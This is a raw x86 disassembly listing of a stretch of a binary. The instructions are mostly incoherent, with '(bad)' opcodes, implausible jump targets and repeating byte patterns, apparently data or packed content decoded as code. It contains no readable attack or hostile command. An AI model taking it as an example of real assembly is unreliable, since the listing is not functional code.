  41c5b7:	add    cl,BYTE PTR [edx+0x21]
  41c5ba:	test   al,0x62
  41c5bc:	xchg   edi,eax
  41c5bd:	add    DWORD PTR [edx],eax
  41c5bf:	cmp    al,BYTE PTR ds:0x8406152
  41c5c5:	ret    0xf9a3
  41c5c8:	sub    al,0x5c
  41c5ca:	(bad)  
  41c5cb:	mov    al,0x8c
  41c5cd:	add    DWORD PTR [ebx+0x622c6362],ebx
  41c5d3:	addr16 mov esi,0x48b84e64
  41c5d9:	call   0x23984bd
  41c5de:	jecxz  0x41c589
  41c5e0:	add    cl,BYTE PTR [ebp+esi*1+0x62]
  41c5e4:	inc    ebx
  41c5e5:	inc    eax
  41c5e6:	adc    BYTE PTR ds:0x4158cc40,al
  41c5ec:	inc    ebx
  41c5ed:	bound  eax,QWORD PTR [ecx+0x40]
  41c5f0:	add    eax,0x4140
  41c5f5:	and    eax,0x40400062
  41c5fa:	add    eax,0x84404340
  41c5ff:	int3   
  41c600:	js     0x41c602
  41c602:	inc    ecx
  41c603:	adc    BYTE PTR [edx+0xf],ah
  41c606:	inc    ecx
  41c607:	jmp    0x41c64a
  41c609:	fs jmp 0x9dc1f0d8
  41c60f:	sbb    BYTE PTR [ecx+0x2b46209],al
  41c615:	lds    esp,FWORD PTR [edi+0x56]
  41c618:	outs   dx,DWORD PTR ds:[esi]
  41c619:	cmp    BYTE PTR [esi+0x5],ah
  41c61c:	fs inc ecx
  41c61e:	inc    esp
  41c61f:	xchg   esp,eax
  41c620:	add    DWORD PTR [ecx-0x602d3444],0x8fff86cd
  41c62a:	push   edx
  41c62b:	inc    ebx
  41c62c:	lock cmp al,0xcd
  41c62f:	add    BYTE PTR [eax+0x41],al
  41c632:	inc    eax
  41c633:	inc    ebx
  41c634:	bound  ax,DWORD PTR ds:0x40434100
  41c63b:	add    eax,0x40054062
  41c640:	bound  eax,QWORD PTR [ecx+0x40]
  41c643:	inc    ebx
  41c644:	inc    eax
  41c645:	add    eax,0x25405841
  41c64a:	bound  eax,QWORD PTR [eax+0x43]
  41c64d:	inc    eax
  41c64e:	adc    ch,al
  41c650:	sbb    al,BYTE PTR ds:0xf862f25c
  41c656:	mov    edx,0x356a86b2
  41c65b:	rol    ch,0x49
  41c65e:	dec    esi
  41c65f:	jg     0x41c675
  41c661:	add    DWORD PTR [eax+0x62],eax
  41c664:	outs   dx,DWORD PTR ds:[esi]
  41c665:	stos   DWORD PTR es:[edi],eax
  41c666:	cmp    eax,0x5f6c0cc6
  41c66b:	inc    ebp
  41c66c:	aad    0x42
  41c66e:	retf   
  41c66f:	add    DWORD PTR [ebx+0x280fb81],eax
  41c675:	xor    eax,0x5745bd50
  41c67a:	push   esp
  41c67b:	daa    
  41c67c:	xor    al,0x40
  41c67e:	dec    esp
  41c67f:	and    al,0x1
  41c681:	add    BYTE PTR [eax+eax*2+0x41],cl
  41c685:	inc    ebx
  41c686:	inc    eax
  41c687:	add    eax,0x43406262
  41c68c:	inc    ecx
  41c68d:	adc    BYTE PTR [eax],al
  41c68f:	inc    eax
  41c690:	add    eax,0x43000562
  41c695:	add    BYTE PTR [ecx+0x40],al
  41c698:	inc    eax
  41c699:	add    eax,0x400062
  41c69e:	inc    ebx
  41c69f:	inc    eax
  41c6a0:	js     0x41c6e3
  41c6a2:	inc    ecx
  41c6a3:	bound  eax,QWORD PTR [eax+0x3f]
  41c6a6:	inc    edi
  41c6a7:	jp     0x41c672
  41c6a9:	pop    esi
  41c6aa:	dec    edi
  41c6ab:	xor    BYTE PTR [esi-0x58],bl
  41c6ae:	cmp    al,bl
  41c6b0:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41c6b2:	add    BYTE PTR [esi-0x4342eec7],bh
  41c6b8:	mov    esp,0xfb3a36bb
  41c6bd:	inc    ecx
  41c6be:	clc    
  41c6bf:	adc    eax,0x8145980d
  41c6c4:	dec    eax
  41c6c5:	inc    ecx
  41c6c6:	push   edi
  41c6c7:	retf   
  41c6c8:	inc    esp
  41c6c9:	sub    DWORD PTR [eax],eax
  41c6cb:	pusha  
  41c6cc:	test   al,0x20
  41c6ce:	inc    esi
  41c6cf:	mov    eax,0x8132a040
  41c6d4:	bound  eax,QWORD PTR [eax+0x5]
  41c6d7:	inc    ecx
  41c6d8:	add    BYTE PTR [ebx+0x40],al
  41c6db:	inc    eax
  41c6dc:	inc    ecx
  41c6dd:	inc    eax
  41c6de:	inc    eax
  41c6df:	bound  eax,QWORD PTR ds:0x5624300
  41c6e5:	add    BYTE PTR [eax+0x40],al
  41c6e8:	add    BYTE PTR [ecx+0x43],al
  41c6eb:	add    BYTE PTR [eax+0x41],al
  41c6ee:	add    eax,0x40436200
  41c6f3:	inc    eax
  41c6f4:	add    eax,0x344d1062
  41c6f9:	dec    ecx
  41c6fa:	test   al,0x8b
  41c6fc:	cli    
  41c6fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6fe:	mov    al,0xcb
  41c700:	in     al,dx
  41c701:	jns    0x41c774
  41c703:	push   cs
  41c704:	push   0xffffff83
  41c706:	inc    edx
  41c707:	dec    esp
  41c708:	cmp    al,0xb0
  41c70a:	leave  
  41c70b:	into   
  41c70c:	test   BYTE PTR [eax-0x1c],al
  41c70f:	add    ah,BYTE PTR [ebx+0x62]
  41c712:	or     eax,0x44002518
  41c717:	inc    ecx
  41c718:	mov    ch,0xb8
  41c71a:	and    eax,0x62244aa6
  41c71f:	inc    ecx
  41c720:	test   al,0xd
  41c722:	inc    eax
  41c723:	or     DWORD PTR [ecx],eax
  41c725:	inc    edi
  41c726:	cld    
  41c727:	inc    ecx
  41c728:	inc    eax
  41c729:	add    eax,0x41624340
  41c72e:	test   BYTE PTR [eax],al
  41c730:	and    eax,0x404043
  41c735:	add    BYTE PTR ds:0x626210,al
  41c73b:	add    eax,0x43404140
  41c740:	inc    eax
  41c741:	inc    ecx
  41c742:	add    eax,0x10664062
  41c747:	inc    ebx
  41c748:	bound  ebp,QWORD PTR [eax]
  41c74a:	inc    eax
  41c74b:	inc    ebp
  41c74c:	test   al,0xad
  41c74e:	xor    BYTE PTR [ecx+0x3e2ae824],al
  41c754:	addr16 push ds
  41c756:	add    eax,DWORD PTR [edx]
  41c758:	(bad)  
  41c75a:	inc    ecx
  41c75b:	pop    esi
  41c75c:	inc    edx
  41c75d:	retf   0x81c3
  41c760:	mov    cl,BYTE PTR [eax+0x46]
  41c763:	stos   DWORD PTR es:[edi],eax
  41c764:	dec    esp
  41c765:	rol    BYTE PTR [edx],1
  41c767:	inc    esi
  41c768:	xor    BYTE PTR ds:0x4041cc05,dl
  41c76e:	add    BYTE PTR [eax],al
  41c770:	add    BYTE PTR [eax+0x40],al
  41c773:	inc    ebx
  41c774:	bound  eax,QWORD PTR [eax]
  41c776:	inc    eax
  41c777:	inc    eax
  41c778:	add    eax,0x62434162
  41c77d:	inc    eax
  41c77e:	js     0x41c790
  41c780:	inc    ecx
  41c781:	add    eax,0x5404325
  41c786:	bound  eax,QWORD PTR [eax+0x40]
  41c789:	inc    ecx
  41c78a:	inc    ebx
  41c78b:	mov    esp,0x2234c9b0
  41c790:	and    DWORD PTR [edx-0x35],0x1726155e
  41c797:	inc    eax
  41c798:	mov    bh,0x7
  41c79a:	push   eax
  41c79b:	stos   DWORD PTR es:[edi],eax
  41c79c:	leave  
  41c79d:	mov    ah,0x9b
  41c79f:	xor    eax,0x1a081943
  41c7a4:	add    al,0x42
  41c7a6:	push   0xfffffff8
  41c7a8:	add    ecx,esi
  41c7aa:	leave  
  41c7ab:	xchg   BYTE PTR [ecx],dl
  41c7ad:	dec    ecx
  41c7ae:	stos   BYTE PTR es:[edi],al
  41c7af:	dec    esp
  41c7b0:	bound  eax,QWORD PTR fs:[eax+0x61]
  41c7b4:	inc    esp
  41c7b5:	in     al,dx
  41c7b6:	jae    0x41c7dd
  41c7b8:	inc    ecx
  41c7b9:	bound  eax,QWORD PTR [ebx+0x0]
  41c7bc:	adc    BYTE PTR [eax+0x0],al
  41c7bf:	add    eax,0x62410040
  41c7c4:	inc    eax
  41c7c5:	add    BYTE PTR [ebx-0x34],al
  41c7c8:	inc    eax
  41c7c9:	add    eax,0x78434040
  41c7ce:	bound  eax,QWORD PTR [ecx+0x78]
  41c7d1:	add    eax,0x62404043
  41c7d6:	add    BYTE PTR [ecx-0x73dffe7c],0x6d
  41c7dd:	push   cs
  41c7de:	ins    DWORD PTR es:[edi],dx
  41c7df:	sub    al,bl
  41c7e1:	and    eax,0xc9bc3465
  41c7e6:	inc    esp
  41c7e7:	add    DWORD PTR [edi+0xd4b6ce4],ebp
  41c7ed:	inc    eax
  41c7ee:	add    BYTE PTR [ebx+0x36],dh
  41c7f1:	dec    ebp
  41c7f2:	cmp    BYTE PTR ds:0x807840c9,dh
  41c7f8:	test   al,0xcb
  41c7fa:	arpl   WORD PTR [ecx+0x40],ax
  41c7fd:	add    eax,0x43436240
  41c802:	add    eax,0x62004040
  41c807:	inc    eax
  41c808:	add    BYTE PTR [ecx+0x40],al
  41c80b:	inc    ebx
  41c80c:	test   BYTE PTR ds:0x58054041,ah
  41c812:	inc    eax
  41c813:	inc    eax
  41c814:	bound  eax,QWORD PTR [eax+0x66]
  41c817:	inc    ecx
  41c818:	inc    eax
  41c819:	add    eax,0x40261000
  41c81e:	inc    eax
  41c81f:	and    eax,0x2324bd1
  41c824:	push   eax
  41c825:	or     al,0x74
  41c827:	jle    0x41c81e
  41c829:	add    esi,esp
  41c82b:	jnp    0x41c879
  41c82d:	inc    eax
  41c82e:	inc    eax
  41c82f:	add    DWORD PTR [ebx+0x28],esp
  41c832:	arpl   WORD PTR [ebx+ecx*8+0x12],cx
  41c836:	jo     0x41c879
  41c838:	ins    BYTE PTR es:[edi],dx
  41c839:	(bad)  
  41c83a:	loopne 0x41c87f
  41c83c:	es inc eax
  41c83e:	loopne 0x41c7c3
  41c840:	add    DWORD PTR ds:0x1545acc4,0xc9c33940
  41c84a:	adc    al,BYTE PTR [eax]
  41c84c:	add    BYTE PTR [ebx+0x40],al
  41c84f:	bound  eax,QWORD PTR ds:0x25404110
  41c855:	add    ah,cl
  41c857:	inc    ebx
  41c858:	add    eax,0x40402562
  41c85d:	add    BYTE PTR [eax+0x40],al
  41c860:	inc    ecx
  41c861:	inc    ecx
  41c862:	add    eax,0x78434025
  41c867:	bound  eax,QWORD PTR [eax-0x7c]
  41c86a:	inc    eax
  41c86b:	inc    ecx
  41c86c:	cwde   
  41c86d:	inc    ebx
  41c86e:	inc    eax
  41c86f:	jb     0x41c7f2
  41c871:	mov    esp,0x24636242
  41c876:	outs   dx,BYTE PTR ds:[esi]
  41c877:	inc    eax
  41c878:	mov    bh,0x41
  41c87a:	into   
  41c87b:	arpl   WORD PTR [ebx-0x6f],cx
  41c87e:	inc    eax
  41c87f:	ins    DWORD PTR es:[edi],dx
  41c880:	popa   
  41c881:	es and esp,ebp
  41c884:	xor    al,0xb
  41c886:	push   cs
  41c887:	inc    eax
  41c888:	add    ecx,DWORD PTR [eax-0x58]
  41c88b:	sar    BYTE PTR [edi-0x30febf3f],1
  41c891:	fs jl  0x41c8f6
  41c894:	dec    esp
  41c895:	stc    
  41c896:	cmovo  eax,DWORD PTR [edi]
  41c899:	sbb    edx,esi
  41c89b:	cmp    al,0x41
  41c89d:	inc    eax
  41c89e:	inc    eax
  41c89f:	inc    ebx
  41c8a0:	int3   
  41c8a1:	add    BYTE PTR ds:0x56240,al
  41c8a7:	inc    ebx
  41c8a8:	inc    eax
  41c8a9:	inc    eax
  41c8aa:	add    BYTE PTR [ecx+0x62],al
  41c8ad:	bound  eax,QWORD PTR [eax]
  41c8af:	int3   
  41c8b0:	inc    eax
  41c8b1:	inc    ebx
  41c8b2:	add    eax,0x43624041
  41c8b7:	adc    BYTE PTR [ecx+0x5],al
  41c8ba:	inc    eax
  41c8bb:	cmp    eax,0xc7134054
  41c8c0:	fsub   QWORD PTR [edx-0x40]
  41c8c3:	ret    
  41c8c4:	(bad)  
  41c8c5:	or     DWORD PTR [eax-0x7f],eax
  41c8c8:	arpl   WORD PTR [ebx+ebp*2+0x5c],bx
  41c8cc:	mov    dl,0x40
  41c8ce:	inc    eax
  41c8cf:	inc    esp
  41c8d0:	add    eax,0x63441630
  41c8d5:	adc    al,0x12
  41c8d7:	add    BYTE PTR [edi-0x7b9a8677],al
  41c8dd:	inc    eax
  41c8de:	inc    edx
  41c8df:	xor    BYTE PTR [ecx],ch
  41c8e1:	bound  eax,QWORD PTR [ebx+0x40]
  41c8e4:	adc    BYTE PTR ds:0x4158cc40,al
  41c8ea:	inc    ebx
  41c8eb:	bound  eax,QWORD PTR [ecx+0x40]
  41c8ee:	add    eax,0x4140
  41c8f3:	and    eax,0x40400062
  41c8f8:	add    eax,0x84404340
  41c8fd:	int3   
  41c8fe:	js     0x41c900
  41c900:	inc    ecx
  41c901:	adc    BYTE PTR [edx+0xf],ah
  41c904:	xor    al,0x65
  41c906:	pushf  
  41c907:	or     al,0x3
  41c909:	add    dh,BYTE PTR [eax+edi*1]
  41c90c:	xor    eax,0x40cd6207
  41c911:	test   eax,0x904cff84
  41c916:	dec    eax
  41c917:	inc    ecx
  41c918:	adc    eax,0xd0622f48
  41c91d:	fs jbe 0x41c94a
  41c920:	inc    eax
  41c921:	and    BYTE PTR [ebp+0x2b],0x90
  41c925:	adc    BYTE PTR [ecx+0x10],0x12
  41c929:	and    eax,DWORD PTR [eax]
  41c92b:	add    al,0xac
  41c92d:	xchg   esp,eax
  41c92e:	push   ebx
  41c92f:	jno    0x41c971
  41c931:	jg     0x41c8e8
  41c933:	arpl   WORD PTR [esi],bx
  41c935:	add    BYTE PTR [eax+0x41],al
  41c938:	inc    eax
  41c939:	inc    ebx
  41c93a:	bound  ax,DWORD PTR ds:0x40434100
  41c941:	add    eax,0x40054062
  41c946:	bound  eax,QWORD PTR [ecx+0x40]
  41c949:	inc    ebx
  41c94a:	inc    eax
  41c94b:	add    eax,0x25405841
  41c950:	bound  eax,QWORD PTR [eax+0x43]
  41c953:	inc    eax
  41c954:	adc    BYTE PTR [edx+0x1149bfd],al
  41c95a:	pusha  
  41c95b:	in     al,0x3a
  41c95d:	js     0x41c907
  41c95f:	bound  eax,QWORD PTR [eax+0x49]
  41c962:	aaa    
  41c963:	test   al,0x63
  41c965:	bound  edx,QWORD PTR [ecx]
  41c967:	sub    dl,BYTE PTR [ebx]
  41c969:	add    DWORD PTR [edx],eax
  41c96b:	adc    dl,BYTE PTR [esi+0x6e]
  41c96e:	jl     0x41c928
  41c970:	inc    eax
  41c971:	imul   ebp,DWORD PTR [esi],0x6c
  41c974:	aam    0x7c
  41c976:	or     BYTE PTR [edx],al
  41c978:	push   cs
  41c979:	xor    eax,0x638c8225
  41c97e:	inc    edx
  41c97f:	or     al,0x40
  41c981:	add    eax,0x43414002
  41c986:	inc    eax
  41c987:	add    eax,0x43406262
  41c98c:	inc    ecx
  41c98d:	adc    BYTE PTR [eax],al
  41c98f:	inc    eax
  41c990:	add    eax,0x43000562
  41c995:	add    BYTE PTR [ecx+0x40],al
  41c998:	inc    eax
  41c999:	add    eax,0x400062
  41c99e:	inc    ebx
  41c99f:	inc    eax
  41c9a0:	js     0x41c9e3
  41c9a2:	inc    ecx
  41c9a3:	bound  eax,QWORD PTR [eax+0x42]
  41c9a6:	rcl    BYTE PTR [ecx-0x73],1
  41c9a9:	leave  
  41c9aa:	or     DWORD PTR [eax+0x32],ebp
  41c9ad:	adc    DWORD PTR [edi+0x4026283c],esp
  41c9b3:	adc    DWORD PTR [ebx+0x38],0xb41075a9
  41c9ba:	pop    ds
  41c9bb:	dec    esp
  41c9bc:	sub    DWORD PTR [esi-0x48],0x4015b866
  41c9c3:	or     eax,0x9128e3c0
  41c9c9:	retf   
  41c9ca:	adc    al,0x43
  41c9cc:	or     DWORD PTR [edx-0x19],edx
  41c9cf:	bound  eax,QWORD PTR [edx-0xa7fbf77]
  41c9d5:	es jg  0x41c9ac
  41c9d8:	imul   esi,DWORD PTR [ebx+0x10],0x35
  41c9dc:	add    DWORD PTR [edx+0x40],esp
  41c9df:	add    eax,0x40430041
  41c9e4:	inc    eax
  41c9e5:	inc    ecx
  41c9e6:	inc    eax
  41c9e7:	inc    eax
  41c9e8:	bound  eax,QWORD PTR ds:0x5624300
  41c9ee:	add    BYTE PTR [eax+0x40],al
  41c9f1:	add    BYTE PTR [ecx+0x43],al
  41c9f4:	add    BYTE PTR [eax+0x41],al
  41c9f7:	add    eax,0x40436200
  41c9fc:	inc    eax
  41c9fd:	add    eax,0xbc342862
  41ca02:	(bad)  [eax+0x40]
  41ca05:	dec    edi
  41ca06:	pop    ss
  41ca07:	bound  esp,QWORD PTR [edx+eiz*2+0x78]
  41ca0b:	dec    ebx
  41ca0c:	sbb    DWORD PTR [ecx+0x1561c50e],eax
  41ca12:	add    ah,al
  41ca14:	inc    eax
  41ca15:	adc    eax,DWORD PTR [ecx-0x82303b1]
  41ca1b:	xor    dl,BYTE PTR [edx]
  41ca1d:	ret    0x192f
  41ca20:	arpl   WORD PTR [ebp+0x4f],ax
  41ca23:	test   al,0x40
  41ca25:	sub    DWORD PTR [ebx],eax
  41ca27:	push   cs
  41ca28:	xor    esp,eax
  41ca2a:	mov    esp,0x41b60312
  41ca2f:	inc    eax
  41ca30:	add    eax,0x41624340
  41ca35:	test   BYTE PTR [eax],al
  41ca37:	and    eax,0x404043
  41ca3c:	add    BYTE PTR ds:0x626210,al
  41ca42:	add    eax,0x43404140
  41ca47:	inc    eax
  41ca48:	inc    ecx
  41ca49:	add    eax,0x10664062
  41ca4e:	inc    ebx
  41ca4f:	bound  esi,QWORD PTR [esi+0x66]
  41ca52:	xchg   esp,eax
  41ca53:	ins    BYTE PTR es:[edi],dx
  41ca54:	dec    eax
  41ca55:	mov    ah,0x40
  41ca57:	add    di,bp
  41ca5a:	push   esp
  41ca5b:	push   ecx
  41ca5c:	mov    BYTE PTR ds:0xa86fc105,dl
  41ca62:	lods   al,BYTE PTR ds:[esi]
  41ca63:	adc    BYTE PTR [eax+0x23a4042],cl
  41ca69:	adc    BYTE PTR [edx-0x3f],ch
  41ca6c:	arpl   WORD PTR [ebp+eax*1-0x34],dx
  41ca70:	inc    ecx
  41ca71:	inc    eax
  41ca72:	add    BYTE PTR [eax],al
  41ca74:	add    BYTE PTR [eax+0x40],al
  41ca77:	inc    ebx
  41ca78:	bound  eax,QWORD PTR [eax]
  41ca7a:	inc    eax
  41ca7b:	inc    eax
  41ca7c:	add    eax,0x62434162
  41ca81:	inc    eax
  41ca82:	js     0x41ca94
  41ca84:	inc    ecx
  41ca85:	add    eax,0x5404325
  41ca8a:	bound  eax,QWORD PTR [eax+0x40]
  41ca8d:	inc    ecx
  41ca8e:	inc    ebx
  41ca8f:	add    al,0xc4
  41ca91:	xor    BYTE PTR [esi+edi*4+0x62],ch
  41ca95:	pop    esp
  41ca96:	xor    BYTE PTR [eax+0x26],al
  41ca99:	cmp    al,0x80
  41ca9b:	gs pop esp
  41ca9d:	or     BYTE PTR [esi+0x42014040],dl
  41caa3:	in     al,dx
  41caa4:	aas    
  41caa5:	push   edx
  41caa6:	les    eax,FWORD PTR [eax+0x2e]
  41caa9:	adc    eax,0x5d93001
  41caae:	dec    edi
  41caaf:	inc    eax
  41cab0:	dec    ebp
  41cab1:	or     BYTE PTR [ebx+ebp*2+0x404c632b],ch
  41cab8:	shl    BYTE PTR [ebx],0x62
  41cabb:	nop
  41cabc:	les    edi,FWORD PTR ds:0x43624125
  41cac2:	add    BYTE PTR [eax],dl
  41cac4:	inc    eax
  41cac5:	add    BYTE PTR ds:0x62410040,al
  41cacb:	inc    eax
  41cacc:	add    BYTE PTR [ebx-0x34],al
  41cacf:	inc    eax
  41cad0:	add    eax,0x78434040
  41cad5:	bound  eax,QWORD PTR [ecx+0x78]
  41cad8:	add    eax,0x62404043
  41cadd:	stos   DWORD PTR es:[edi],eax
  41cade:	or     al,0x23
  41cae0:	mov    dh,0x5b
  41cae2:	(bad)  
  41cae3:	bound  esp,QWORD PTR [edx+0x66]
  41cae6:	inc    eax
  41cae7:	dec    ebp
  41cae8:	jl     0xa87510cb
  41caee:	or     eax,0x185500c3
  41caf3:	loopne 0x41cb0f
  41caf5:	adc    DWORD PTR [eax-0x7b],eax
  41caf8:	xor    cl,bl
  41cafa:	xor    al,0x68
  41cafc:	jno    0x41cab2
  41cafe:	adc    al,0x25
  41cb00:	push   0xfffffff8
  41cb02:	pop    ebp
  41cb03:	or     eax,0xc2400d64
  41cb08:	add    DWORD PTR [ecx+0x40],eax
  41cb0b:	add    eax,0x43436240
  41cb10:	add    eax,0x62004040
  41cb15:	inc    eax
  41cb16:	add    BYTE PTR [ecx+0x40],al
  41cb19:	inc    ebx
  41cb1a:	test   BYTE PTR ds:0x58054041,ah
  41cb20:	inc    eax
  41cb21:	inc    eax
  41cb22:	bound  eax,QWORD PTR [eax+0x66]
  41cb25:	inc    ecx
  41cb26:	inc    eax
  41cb27:	add    eax,0x7b886200
  41cb2c:	and    ebp,ecx
  41cb2e:	or     BYTE PTR [edx],dh
  41cb30:	sbb    al,ch
  41cb32:	test   al,0xbc
  41cb34:	nop
  41cb35:	inc    ebx
  41cb36:	inc    eax
  41cb37:	jmp    0x41caba
  41cb39:	dec    edi
  41cb3a:	adc    cl,BYTE PTR ds:0xc16e2866
  41cb40:	inc    esp
  41cb41:	push   eax
  41cb42:	inc    ecx
  41cb43:	inc    ecx
  41cb44:	outs   dx,BYTE PTR ds:[esi]
  41cb45:	mov    WORD PTR [eax+0x2f],es
  41cb48:	add    BYTE PTR [edx+0x6d78],ah
  41cb4e:	inc    ebx
  41cb4f:	inc    eax
  41cb50:	bound  eax,QWORD PTR ds:0x25404110
  41cb56:	add    ah,cl
  41cb58:	inc    ebx
  41cb59:	add    eax,0x40402562
  41cb5e:	add    BYTE PTR [eax+0x40],al
  41cb61:	inc    ecx
  41cb62:	inc    ecx
  41cb63:	add    eax,0x78434025
  41cb68:	bound  eax,QWORD PTR [eax-0x7c]
  41cb6b:	inc    eax
  41cb6c:	inc    ecx
  41cb6d:	test   al,0x41
  41cb6f:	push   cs
  41cb70:	leave  
  41cb71:	and    eax,ebx
  41cb73:	enter  0x4520,0xec
  41cb77:	inc    eax
  41cb78:	dec    ecx
  41cb79:	repnz push ecx
  41cb7b:	bound  ebx,QWORD PTR [ebx+0x16]
  41cb7e:	test   eax,0x438fc30f
  41cb83:	loopne 0x41cb2e
  41cb85:	adc    ecx,DWORD PTR [edi+0x40]
  41cb88:	push   edi
  41cb89:	inc    ecx
  41cb8a:	inc    eax
  41cb8b:	inc    eax
  41cb8c:	inc    ebx
  41cb8d:	int3   
  41cb8e:	add    BYTE PTR ds:0x56240,al
  41cb94:	inc    ebx
  41cb95:	inc    eax
  41cb96:	inc    eax
  41cb97:	add    BYTE PTR [ecx+0x62],al
  41cb9a:	bound  eax,QWORD PTR [eax]
  41cb9c:	int3   
  41cb9d:	inc    eax
  41cb9e:	inc    ebx
  41cb9f:	add    eax,0x43624041
  41cba4:	adc    BYTE PTR [ecx+0x5],al
  41cba7:	inc    eax
  41cba8:	inc    ecx
  41cba9:	add    DWORD PTR ds:0x93562a8,ecx
  41cbaf:	ret    
  41cbb0:	and    BYTE PTR [ebx+ecx*8],0x5
  41cbb4:	leave  
  41cbb5:	inc    esi
  41cbb6:	inc    eax
  41cbb7:	sbb    bh,bl
  41cbb9:	(bad)  
  41cbba:	out    dx,eax
  41cbbb:	leave  
  41cbbc:	test   eax,0x2dc514ec
  41cbc1:	and    eax,0x6cb0ac23
  41cbc6:	inc    eax
  41cbc7:	cmp    DWORD PTR [edi],ecx
  41cbc9:	fadd   QWORD PTR [ebx+eax*2-0x53]
  41cbcd:	mov    ch,0x62
  41cbcf:	inc    ebx
  41cbd0:	inc    eax
  41cbd1:	adc    BYTE PTR ds:0x4158cc40,al
  41cbd7:	inc    ebx
  41cbd8:	bound  eax,QWORD PTR [ecx+0x40]
  41cbdb:	add    eax,0x4140
  41cbe0:	and    eax,0x40400062
  41cbe5:	add    eax,0x84404340
  41cbea:	int3   
  41cbeb:	js     0x41cbed
  41cbed:	inc    ecx
  41cbee:	adc    BYTE PTR [edx+0xf],ah
  41cbf1:	add    eax,edi
  41cbf3:	test   BYTE PTR [ebx-0x40],ah
  41cbf6:	adc    eax,0xff40483f
  41cbfb:	push   es
  41cbfc:	aas    
  41cbfd:	inc    ecx
  41cbfe:	sub    BYTE PTR [ebp+0x2e],cl
  41cc01:	adc    eax,0xccdc3b6d
  41cc06:	es cmp al,0xcb
  41cc09:	inc    eax
  41cc0a:	(bad)  
  41cc0b:	nop
  41cc0c:	les    ebp,FWORD PTR [edx]
  41cc0e:	sub    al,0x59
  41cc10:	dec    esp
  41cc11:	adc    al,BYTE PTR [edx]
  41cc13:	bound  ecx,QWORD PTR [edi-0x7f]
  41cc16:	bound  ecx,QWORD PTR [eax+0x48c140f5]
  41cc1c:	shr    DWORD PTR [eax+0x40005050],1
  41cc22:	inc    ecx
  41cc23:	inc    eax
  41cc24:	inc    ebx
  41cc25:	bound  ax,DWORD PTR ds:0x40434100
  41cc2c:	add    eax,0x40054062
  41cc31:	bound  eax,QWORD PTR [ecx+0x40]
  41cc34:	inc    ebx
  41cc35:	inc    eax
  41cc36:	add    eax,0x25405841
  41cc3b:	bound  eax,QWORD PTR [eax+0x43]
  41cc3e:	inc    eax
  41cc3f:	adc    cl,al
  41cc41:	adc    al,0x4e
  41cc43:	xchg   BYTE PTR [ebp+0x45],dl
  41cc46:	shl    BYTE PTR [ebx+0x4a],0x40
  41cc4a:	sar    BYTE PTR [edx+0x5],0x3f
  41cc4e:	jmp    0x2955a230
  41cc53:	jns    0x41cc1e
  41cc55:	inc    esp
  41cc56:	add    BYTE PTR [eax+0x30],al
  41cc59:	inc    eax
  41cc5a:	arpl   WORD PTR [edx],ax
  41cc5c:	nop
  41cc5d:	dec    ebx
  41cc5e:	jbe    0x41cc98
  41cc60:	push   esp
  41cc61:	push   cs
  41cc62:	rcl    BYTE PTR ds:0x40ce2dbf,0x41
  41cc69:	inc    ebx
  41cc6a:	inc    eax
  41cc6b:	add    eax,0x43406262
  41cc70:	inc    ecx
  41cc71:	adc    BYTE PTR [eax],al
  41cc73:	inc    eax
  41cc74:	add    eax,0x43000562
  41cc79:	add    BYTE PTR [ecx+0x40],al
  41cc7c:	inc    eax
  41cc7d:	add    eax,0x400062
  41cc82:	inc    ebx
  41cc83:	inc    eax
  41cc84:	js     0x41ccc7
  41cc86:	inc    ecx
  41cc87:	bound  eax,QWORD PTR [eax+0x1d]
  41cc8a:	leave  
  41cc8b:	inc    eax
  41cc8c:	test   eax,0x621f4124
  41cc91:	mov    WORD PTR [esi],fs
  41cc93:	or     DWORD PTR [esi-0x3d],edx
  41cc96:	fimul  WORD PTR ds:0x40b8666d
  41cc9c:	shl    BYTE PTR [edx+0x40],0x5
  41cca0:	inc    ecx
  41cca1:	add    BYTE PTR [ebx+0x40],al
  41cca4:	inc    eax
  41cca5:	inc    ecx
  41cca6:	inc    eax
  41cca7:	inc    eax
  41cca8:	bound  eax,QWORD PTR ds:0x5624300
  41ccae:	add    BYTE PTR [eax+0x40],al
  41ccb1:	add    BYTE PTR [ecx+0x43],al
  41ccb4:	add    BYTE PTR [eax+0x41],al
  41ccb7:	add    eax,0x40436200
  41ccbc:	inc    eax
  41ccbd:	add    eax,0x74a88262
  41ccc2:	and    BYTE PTR [eax+0x42],dl
  41ccc5:	pop    ds
  41ccc6:	xor    ebp,DWORD PTR [ebp+0x62]
  41ccc9:	or     bh,BYTE PTR [edi+0x6c]
  41cccc:	sbb    al,BYTE PTR [eax-0x56]
  41cccf:	add    BYTE PTR [ebp+0x62],al
  41ccd2:	push   eax
  41ccd3:	jmp    0x41cc99
  41ccd5:	adc    al,0x1d
  41ccd7:	sbb    al,0xcb
  41ccda:	arpl   WORD PTR [eax+0x24c2406b],dx
  41cce0:	cmp    al,0xdb
  41cce2:	cli    
  41cce3:	bound  eax,QWORD PTR [ecx+0x10]
  41cce6:	test   eax,0x4131a84e
  41cceb:	inc    eax
  41ccec:	add    eax,0x41624340
  41ccf1:	test   BYTE PTR [eax],al
  41ccf3:	and    eax,0x404043
  41ccf8:	add    BYTE PTR ds:0x626210,al
  41ccfe:	add    eax,0x43404140
  41cd03:	inc    eax
  41cd04:	inc    ecx
  41cd05:	add    eax,0x10664062
  41cd0a:	inc    ebx
  41cd0b:	bound  edx,QWORD PTR [eax+0x6c4080b4]
  41cd11:	add    dl,BYTE PTR [edx]
  41cd13:	push   eax
  41cd14:	bound  edx,QWORD PTR [ebp-0x3d]
  41cd17:	sbb    eax,eax
  41cd19:	and    dh,BYTE PTR [esp+ebx*8+0x4041a545]
  41cd20:	test   eax,0x24534147
  41cd25:	push   edx
  41cd26:	inc    ecx
  41cd27:	adc    al,BYTE PTR [ebp-0x7e]
  41cd2a:	pop    ss
  41cd2b:	mov    al,ds:0x40f44536
  41cd30:	rcl    BYTE PTR ds:0x51a83488,0x8b
  41cd37:	add    ebp,DWORD PTR [ecx+0x4041cc05]
  41cd3d:	add    BYTE PTR [eax],al
  41cd3f:	add    BYTE PTR [eax+0x40],al
  41cd42:	inc    ebx
  41cd43:	bound  eax,QWORD PTR [eax]
  41cd45:	inc    eax
  41cd46:	inc    eax
  41cd47:	add    eax,0x62434162
  41cd4c:	inc    eax
  41cd4d:	js     0x41cd5f
  41cd4f:	inc    ecx
  41cd50:	add    eax,0x5404325
  41cd55:	bound  eax,QWORD PTR [eax+0x40]
  41cd58:	inc    ecx
  41cd59:	inc    ebx
  41cd5a:	cmp    BYTE PTR [edx-0x80],ah
